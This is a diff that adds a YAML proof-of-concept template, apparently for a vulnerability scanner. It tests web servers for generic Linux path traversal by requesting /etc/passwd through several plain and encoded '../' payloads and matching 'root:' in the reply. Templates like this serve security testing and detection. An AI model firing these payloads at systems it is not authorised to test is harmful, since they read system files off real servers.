@@ -1,0 +1,27 @@
+id: poc-yaml-generic-path-traversal-linux
+info:
+  name: 通用路径穿越漏洞 (Linux)
+  severity: high
+  tags:
+  - 目录遍历
+  finger: ''
+variables:
+  r_path: '/../../../../../../../../../../../../../../../../etc/passwd
+
+    /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+
+    /..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd
+
+    /etc/passwd
+
+    /%2f/../%2f/../%2f/../%2f/../%2f/../%2f/../%2f/../etc/passwd
+
+    /%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd'
+requests:
+- method: GET
+  path: '{{.r_path}}'
+  expression: 'status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<")
+
+    '
+transport: http
